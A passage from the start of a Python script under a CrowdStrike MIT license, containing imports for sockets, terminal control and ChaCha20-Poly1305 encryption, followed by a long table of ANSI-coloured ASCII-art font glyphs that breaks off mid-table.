#!/usr/bin/env python3
#
# MIT License
#
# Copyright (c) 2021 CrowdStrike Inc.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import argparse
import os
import io
import sys
import struct
import socket
import itertools
import base64
import tty
import termios
import json
import re
from contextlib import suppress
from time import sleep
from functools import partial
from concurrent.futures import ThreadPoolExecutor
from Crypto.Cipher import ChaCha20_Poly1305
from Crypto.Protocol.KDF import scrypt
from Crypto.Random import get_random_bytes


table = ["", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "     \n     \n     \n     \n     \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m_\u001b[0m\n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0m\n \u001b[0;1;33;93m/\u001b[0;1;32;92m_/\u001b[0m \n\u001b[0;1;32;92m(_\u001b[0;1;36;96m)\u001b[0m  \n     \n", " \u001b[0;1;35;95m_\u001b[0m \u001b[0;1;31;91m_\u001b[0m \n\u001b[0;1;31;91m(\u001b[0m \u001b[0;1;33;93m|\u001b[0m \u001b[0;1;32;92m)\u001b[0m\n\u001b[0;1;33;93m|/\u001b[0;1;32;92m|/\u001b[0m \n     \n     \n", "     \u001b[0;1;33;93m_\u001b[0;1;32;92m__\u001b[0;1;36;96m_\u001b[0m \n  \u001b[0;1;33;93m__\u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m/\u001b[0m \u001b[0;1;34;94m/_\u001b[0m\n \u001b[0;1;33;93m/\u001b[0;1;32;92m_\u001b[0m  \u001b[0;1;36;96m.\u001b[0m \u001b[0;1;34;94m_\u001b[0;1;35;95m_/\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0m    \u001b[0;1;35;95m__\u001b[0;1;31;91m/\u001b[0m \n \u001b[0;1;36;96m/\u001b[0;1;34;94m_/\u001b[0;1;35;95m_/\u001b[0m    \n", "     \n  \u001b[0;1;33;93m_/\u001b[0;1;32;92m/\u001b[0m\n \u001b[0;1;33;93m(\u001b[0;1;32;92m_-\u001b[0;1;36;96m<\u001b[0m\n\u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m\n\u001b[0;1;36;96m//\u001b[0m   \n", " \u001b[0;1;35;95m_\u001b[0m   \u001b[0;1;33;93m_\u001b[0;1;32;92m_\u001b[0m\n\u001b[0;1;31;91m(_\u001b[0;1;33;93m)_\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m\n \u001b[0;1;33;93m_\u001b[0;1;32;92m/_\u001b[0;1;36;96m/_\u001b[0m \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m \u001b[0;1;34;94m(_\u001b[0;1;35;95m)\u001b[0m\n       \n", "  \u001b[0;1;31;91m__\u001b[0;1;33;93m__\u001b[0m   \n \u001b[0;1;31;91m/\u001b[0m \u001b[0;1;33;93m_\u001b[0;1;32;92m_/\u001b[0;1;36;96m__\u001b[0;1;34;94m_\u001b[0m\n \u001b[0;1;33;93m>\u001b[0m \u001b[0;1;32;92m_\u001b[0;1;36;96m/_\u001b[0m \u001b[0;1;34;94m_\u001b[0;1;35;95m/\u001b[0m\n\u001b[0;1;32;92m|_\u001b[0;1;36;96m__\u001b[0;1;34;94m__\u001b[0;1;35;95m/\u001b[0m  \n         \n", " \u001b[0;1;35;95m_\u001b[0m \n\u001b[0;1;31;91m(\u001b[0m \u001b[0;1;33;93m)\u001b[0m\n\u001b[0;1;33;93m|/\u001b[0m \n   \n   \n", "    \u001b[0;1;33;93m__\u001b[0m\n  \u001b[0;1;33;93m_/\u001b[0;1;32;92m_/\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0m  \n\u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m/\u001b[0m   \n\u001b[0;1;36;96m|_\u001b[0;1;34;94m|\u001b[0m   \n", "    \u001b[0;1;33;93m_\u001b[0m \n   \u001b[0;1;33;93m|\u001b[0m \u001b[0;1;32;92m|\u001b[0m\n   \u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m/\u001b[0m\n \u001b[0;1;32;92m_\u001b[0;1;36;96m/_\u001b[0;1;34;94m/\u001b[0m \n\u001b[0;1;36;96m/_\u001b[0;1;34;94m/\u001b[0m   \n", "    \n \u001b[0;1;31;91m_\u001b[0;1;33;93m/|\u001b[0m\n\u001b[0;1;33;93m>\u001b[0m \u001b[0;1;32;92m_<\u001b[0m\n\u001b[0;1;32;92m|/\u001b[0m  \n    \n", "    \u001b[0;1;33;93m__\u001b[0m \n \u001b[0;1;31;91m_\u001b[0;1;33;93m_/\u001b[0m \u001b[0;1;32;92m/\u001b[0;1;36;96m_\u001b[0m\n\u001b[0;1;33;93m/_\u001b[0m  \u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m\n \u001b[0;1;32;92m/\u001b[0;1;36;96m_/\u001b[0m   \n       \n", "   \n   \n \u001b[0;1;33;93m_\u001b[0m \n\u001b[0;1;32;92m(\u001b[0m \u001b[0;1;36;96m)\u001b[0m\n\u001b[0;1;36;96m|/\u001b[0m \n", "     \n \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m\n\u001b[0;1;33;93m/_\u001b[0;1;32;92m__\u001b[0;1;36;96m/\u001b[0m\n     \n     \n", "   \n   \n \u001b[0;1;33;93m_\u001b[0m \n\u001b[0;1;32;92m(_\u001b[0;1;36;96m)\u001b[0m\n   \n", "     \u001b[0;1;33;93m_\u001b[0;1;32;92m_\u001b[0m\n   \u001b[0;1;33;93m_\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m\n \u001b[0;1;33;93m_\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m  \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m    \n       \n", "  \u001b[0;1;31;91m__\u001b[0;1;33;93m_\u001b[0m \n \u001b[0;1;31;91m/\u001b[0m \u001b[0;1;33;93m_\u001b[0m \u001b[0;1;32;92m\\\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m//\u001b[0m \u001b[0;1;36;96m/\u001b[0m\n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m \n      \n", "  \u001b[0;1;31;91m__\u001b[0;1;33;93m_\u001b[0m\n \u001b[0;1;31;91m<\u001b[0m  \u001b[0;1;32;92m/\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0m \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m  \n     \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0m \n  \u001b[0;1;33;93m|_\u001b[0m  \u001b[0;1;36;96m|\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0;1;36;96m_/\u001b[0m \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m__\u001b[0;1;34;94m_/\u001b[0m \n       \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m\n  \u001b[0;1;33;93m|_\u001b[0m  \u001b[0;1;36;96m/\u001b[0m\n \u001b[0;1;33;93m_\u001b[0;1;32;92m/_\u001b[0m \u001b[0;1;36;96m<\u001b[0m \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m__\u001b[0;1;34;94m_/\u001b[0m \n       \n", "  \u001b[0;1;31;91m__\u001b[0;1;33;93m__\u001b[0m\n \u001b[0;1;31;91m/\u001b[0m \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0m\n\u001b[0;1;33;93m/_\u001b[0m  \u001b[0;1;36;96m_/\u001b[0m\n \u001b[0;1;32;92m/\u001b[0;1;36;96m_/\u001b[0m  \n      \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m\n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m__\u001b[0;1;36;96m/\u001b[0m\n \u001b[0;1;33;93m/\u001b[0;1;32;92m__\u001b[0m \u001b[0;1;36;96m\\\u001b[0m \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m__\u001b[0;1;34;94m_/\u001b[0m \n       \n", "  \u001b[0;1;31;91m__\u001b[0;1;33;93m__\u001b[0m\n \u001b[0;1;31;91m/\u001b[0m \u001b[0;1;33;93m_\u001b[0;1;32;92m_/\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m\\\u001b[0m \n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m \n      \n", " \u001b[0;1;35;95m_\u001b[0;1;31;91m__\u001b[0;1;33;93m_\u001b[0m\n\u001b[0;1;31;91m/_\u001b[0m  \u001b[0;1;32;92m/\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0m \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m  \n     \n", "  \u001b[0;1;31;91m__\u001b[0;1;33;93m_\u001b[0m \n \u001b[0;1;31;91m(\u001b[0m \u001b[0;1;33;93m_\u001b[0m \u001b[0;1;32;92m)\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m  \u001b[0;1;36;96m|\u001b[0m\n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m \n      \n", "  \u001b[0;1;31;91m__\u001b[0;1;33;93m_\u001b[0m \n \u001b[0;1;31;91m/\u001b[0m \u001b[0;1;33;93m_\u001b[0m \u001b[0;1;32;92m\\\u001b[0m\n \u001b[0;1;33;93m\\\u001b[0;1;32;92m_,\u001b[0m \u001b[0;1;36;96m/\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m \n      \n", "   \u001b[0;1;31;91m_\u001b[0m \n  \u001b[0;1;33;93m(_\u001b[0;1;32;92m)\u001b[0m\n \u001b[0;1;33;93m_\u001b[0m   \n\u001b[0;1;32;92m(_\u001b[0;1;36;96m)\u001b[0m  \n     \n", "   \u001b[0;1;31;91m_\u001b[0m \n  \u001b[0;1;33;93m(_\u001b[0;1;32;92m)\u001b[0m\n \u001b[0;1;33;93m_\u001b[0m   \n\u001b[0;1;32;92m(\u001b[0m \u001b[0;1;36;96m)\u001b[0m  \n\u001b[0;1;36;96m|/\u001b[0m   \n", "  \u001b[0;1;31;91m__\u001b[0m\n \u001b[0;1;31;91m/\u001b[0m \u001b[0;1;33;93m/\u001b[0m\n\u001b[0;1;33;93m<\u001b[0m \u001b[0;1;32;92m<\u001b[0m \n \u001b[0;1;32;92m\\\u001b[0;1;36;96m_\\\u001b[0m\n    \n", "      \n  \u001b[0;1;33;93m__\u001b[0;1;32;92m__\u001b[0m\n \u001b[0;1;33;93m/\u001b[0;1;32;92m__\u001b[0;1;36;96m_/\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m \n      \n", "\u001b[0;1;35;95m__\u001b[0m  \n\u001b[0;1;31;91m\\\u001b[0m \u001b[0;1;33;93m\\\u001b[0m \n \u001b[0;1;33;93m>\u001b[0m \u001b[0;1;32;92m>\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m \n    \n", " \u001b[0;1;35;95m_\u001b[0;1;31;91m__\u001b[0m \n\u001b[0;1;31;91m/_\u001b[0;1;33;93m_\u001b[0m \u001b[0;1;32;92m\\\u001b[0m\n \u001b[0;1;33;93m/\u001b[0;1;32;92m__\u001b[0;1;36;96m/\u001b[0m\n\u001b[0;1;32;92m(_\u001b[0;1;36;96m)\u001b[0m  \n     \n", "  \u001b[0;1;31;91m__\u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m \n \u001b[0;1;31;91m/\u001b[0m \u001b[0;1;33;93m_\u001b[0;1;32;92m__\u001b[0m \u001b[0;1;36;96m\\\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m_\u001b[0m \u001b[0;1;34;94m`/\u001b[0m\n\u001b[0;1;32;92m\\\u001b[0m \u001b[0;1;36;96m\\_\u001b[0;1;34;94m,_\u001b[0;1;35;95m/\u001b[0m \n \u001b[0;1;36;96m\\\u001b[0;1;34;94m__\u001b[0;1;35;95m_/\u001b[0m  \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0m \n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m|\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0;1;36;96m_\u001b[0m \u001b[0;1;34;94m|\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m \u001b[0;1;34;94m|_\u001b[0;1;35;95m|\u001b[0m\n       \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0m \n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m)\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m  \u001b[0;1;34;94m|\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m__\u001b[0;1;34;94m_/\u001b[0m \n       \n", "  \u001b[0;1;31;91m__\u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m\n \u001b[0;1;31;91m/\u001b[0m \u001b[0;1;33;93m_\u001b[0;1;32;92m__\u001b[0;1;36;96m/\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/_\u001b[0;1;36;96m_\u001b[0m  \n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m  \n       \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0m \n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m\\\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0;1;36;96m/\u001b[0m \u001b[0;1;34;94m/\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m__\u001b[0;1;34;94m_/\u001b[0m \n       \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m\n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m__\u001b[0;1;36;96m/\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0;1;36;96m/\u001b[0m  \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m  \n       \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m\n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m__\u001b[0;1;36;96m/\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0;1;36;96m/\u001b[0m  \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m    \n       \n", "  \u001b[0;1;31;91m__\u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m\n \u001b[0;1;31;91m/\u001b[0m \u001b[0;1;33;93m_\u001b[0;1;32;92m__\u001b[0;1;36;96m/\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m(_\u001b[0m \u001b[0;1;36;96m/\u001b[0m \n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m  \n       \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m_\u001b[0m \u001b[0;1;32;92m__\u001b[0m\n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m//\u001b[0m \u001b[0;1;36;96m/\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m  \u001b[0;1;34;94m/\u001b[0m \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m//\u001b[0;1;34;94m_/\u001b[0m  \n        \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m\n  \u001b[0;1;33;93m/\u001b[0m  \u001b[0;1;32;92m_\u001b[0;1;36;96m/\u001b[0m\n \u001b[0;1;33;93m_\u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m/\u001b[0m  \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m  \n       \n", "     \u001b[0;1;33;93m_\u001b[0;1;32;92m_\u001b[0m\n \u001b[0;1;31;91m_\u001b[0;1;33;93m_\u001b[0m \u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m/\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m//\u001b[0m \u001b[0;1;36;96m/\u001b[0m \n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m  \n       \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m_\u001b[0m \u001b[0;1;32;92m__\u001b[0m\n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m//\u001b[0;1;36;96m_/\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m,\u001b[0;1;36;96m<\u001b[0m   \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/|\u001b[0;1;34;94m_|\u001b[0m  \n        \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m_\u001b[0m \n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0m \n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0;1;36;96m__\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m__\u001b[0;1;34;94m_/\u001b[0m\n      \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m_\u001b[0m  \u001b[0;1;32;92m_\u001b[0;1;36;96m__\u001b[0m\n  \u001b[0;1;33;93m/\u001b[0m  \u001b[0;1;32;92m|\u001b[0;1;36;96m/\u001b[0m  \u001b[0;1;34;94m/\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0;1;36;96m|_\u001b[0;1;34;94m/\u001b[0m \u001b[0;1;35;95m/\u001b[0m \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m  \u001b[0;1;34;94m/\u001b[0;1;35;95m_/\u001b[0m  \n          \n", "   \u001b[0;1;31;91m_\u001b[0m  \u001b[0;1;32;92m__\u001b[0m\n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m|/\u001b[0m \u001b[0;1;36;96m/\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m    \u001b[0;1;34;94m/\u001b[0m \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/|\u001b[0;1;34;94m_/\u001b[0m  \n        \n", "  \u001b[0;1;31;91m__\u001b[0;1;33;93m__\u001b[0m \n \u001b[0;1;31;91m/\u001b[0m \u001b[0;1;33;93m_\u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m\\\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m \u001b[0;1;34;94m/\u001b[0m\n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m__\u001b[0;1;34;94m_/\u001b[0m \n       \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0m \n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m\\\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m    \n       \n", "  \u001b[0;1;31;91m__\u001b[0;1;33;93m__\u001b[0m \n \u001b[0;1;31;91m/\u001b[0m \u001b[0;1;33;93m_\u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m\\\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m \u001b[0;1;34;94m/\u001b[0m\n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m__\u001b[0;1;34;94m\\_\u001b[0;1;35;95m\\\u001b[0m\n       \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0m \n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m\\\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m,\u001b[0m \u001b[0;1;36;96m_\u001b[0;1;34;94m/\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/|\u001b[0;1;34;94m_|\u001b[0m \n       \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m\n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m__\u001b[0;1;36;96m/\u001b[0m\n \u001b[0;1;33;93m_\u001b[0;1;32;92m\\\u001b[0m \u001b[0;1;36;96m\\\u001b[0m  \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m  \n       \n", " \u001b[0;1;35;95m_\u001b[0;1;31;91m__\u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m\n\u001b[0;1;31;91m/_\u001b[0m  \u001b[0;1;32;92m__\u001b[0;1;36;96m/\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0m   \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m    \n       \n", "  \u001b[0;1;31;91m__\u001b[0m  \u001b[0;1;32;92m__\u001b[0m\n \u001b[0;1;31;91m/\u001b[0m \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m/\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m \u001b[0;1;34;94m/\u001b[0m \n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m__\u001b[0;1;34;94m_/\u001b[0m  \n        \n", " \u001b[0;1;35;95m_\u001b[0m   \u001b[0;1;33;93m_\u001b[0;1;32;92m_\u001b[0m\n\u001b[0;1;31;91m|\u001b[0m \u001b[0;1;33;93m|\u001b[0m \u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m/\u001b[0m\n\u001b[0;1;33;93m|\u001b[0m \u001b[0;1;32;92m|/\u001b[0m \u001b[0;1;36;96m/\u001b[0m \n\u001b[0;1;32;92m|_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m  \n       \n", " \u001b[0;1;35;95m_\u001b[0m      \u001b[0;1;36;96m__\u001b[0m\n\u001b[0;1;31;91m|\u001b[0m \u001b[0;1;33;93m|\u001b[0m \u001b[0;1;32;92m/|\u001b[0m \u001b[0;1;36;96m/\u001b[0m \u001b[0;1;34;94m/\u001b[0m\n\u001b[0;1;33;93m|\u001b[0m \u001b[0;1;32;92m|/\u001b[0m \u001b[0;1;36;96m|\u001b[0;1;34;94m/\u001b[0m \u001b[0;1;35;95m/\u001b[0m \n\u001b[0;1;32;92m|_\u001b[0;1;36;96m_/\u001b[0;1;34;94m|_\u001b[0;1;35;95m_/\u001b[0m  \n          \n", "   \u001b[0;1;31;91m_\u001b[0m  \u001b[0;1;32;92m__\u001b[0m\n  \u001b[0;1;33;93m|\u001b[0m \u001b[0;1;32;92m|/\u001b[0;1;36;96m_/\u001b[0m\n \u001b[0;1;33;93m_\u001b[0;1;32;92m>\u001b[0m  \u001b[0;1;36;96m<\u001b[0m  \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/|\u001b[0;1;34;94m_|\u001b[0m  \n        \n", "\u001b[0;1;35;95m__\u001b[0m  \u001b[0;1;33;93m__\u001b[0m\n\u001b[0;1;31;91m\\\u001b[0m \u001b[0;1;33;93m\\/\u001b[0m \u001b[0;1;32;92m/\u001b[0m\n \u001b[0;1;33;93m\\\u001b[0m  \u001b[0;1;36;96m/\u001b[0m \n \u001b[0;1;32;92m/\u001b[0;1;36;96m_/\u001b[0m  \n      \n", " \u001b[0;1;35;95m_\u001b[0;1;31;91m__\u001b[0;1;33;93m_\u001b[0m\n\u001b[0;1;31;91m/_\u001b[0m  \u001b[0;1;32;92m/\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0;1;36;96m_\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m\n     \n", "    \u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m\n   \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0;1;36;96m/\u001b[0m\n  \u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m/\u001b[0m  \n \u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m/\u001b[0m   \n\u001b[0;1;36;96m/_\u001b[0;1;34;94m_/\u001b[0m   \n", "\u001b[0;1;35;95m__\u001b[0m   \n\u001b[0;1;31;91m\\\u001b[0m \u001b[0;1;33;93m\\\u001b[0m  \n \u001b[0;1;33;93m\\\u001b[0m \u001b[0;1;32;92m\\\u001b[0m \n  \u001b[0;1;36;96m\\_\u001b[0;1;34;94m\\\u001b[0m\n     \n", "    \u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m\n   \u001b[0;1;33;93m/\u001b[0m  \u001b[0;1;36;96m/\u001b[0m\n   \u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m/\u001b[0m \n \u001b[0;1;32;92m_\u001b[0;1;36;96m/\u001b[0m \u001b[0;1;34;94m/\u001b[0m  \n\u001b[0;1;36;96m/_\u001b[0;1;34;94m_/\u001b[0m   \n", " \u001b[0;1;35;95m/\u001b[0;1;31;91m/|\u001b[0m\n\u001b[0;1;31;91m|/\u001b[0;1;33;93m||\u001b[0m\n    \n    \n    \n", "     \n     \n     \n \u001b[0;1;32;92m_\u001b[0;1;36;96m__\u001b[0;1;34;94m_\u001b[0m\n\u001b[0;1;36;96m/_\u001b[0;1;34;94m__\u001b[0;1;35;95m/\u001b[0m\n", " \u001b[0;1;35;95m_\u001b[0m \n\u001b[0;1;31;91m(\u001b[0m \u001b[0;1;33;93m)\u001b[0m\n \u001b[0;1;33;93mV\u001b[0m \n   \n   \n", "      \n \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0m \u001b[0;1;32;92m_\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m`/\u001b[0m\n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m,_\u001b[0;1;34;94m/\u001b[0m \n      \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m_\u001b[0m \n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0m \n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m\\\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m._\u001b[0;1;34;94m_/\u001b[0m\n      \n", "     \n \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m__\u001b[0;1;36;96m/\u001b[0m\n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m_/\u001b[0m \n     \n", "     \u001b[0;1;33;93m_\u001b[0;1;32;92m_\u001b[0m\n \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m/\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m  \u001b[0;1;36;96m/\u001b[0m \n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m,_\u001b[0;1;34;94m/\u001b[0m  \n       \n", "     \n \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0m \n\u001b[0;1;33;93m/\u001b[0m 